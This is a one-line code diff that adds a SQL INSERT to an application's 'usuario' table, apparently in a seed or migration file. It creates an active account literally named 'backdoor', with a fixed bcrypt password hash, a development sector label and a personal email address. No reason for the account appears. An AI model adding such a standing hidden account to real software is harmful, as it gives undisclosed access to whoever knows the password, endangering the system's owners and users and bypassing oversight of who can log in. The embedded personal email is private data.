@@ -1,0 +1,1 @@
+INSERT INTO usuario (nome, senha, setor, email, ativo) VALUES ('backdoor', '$2a$10$5V4e.S6VFR8XAqwtrIws0uNzAQN5g8wlHeKJKZZAdnF/yJlFc3Q0W', 'Desenvolvimento', 'medson.oliveira.jr@gmail.com', true);
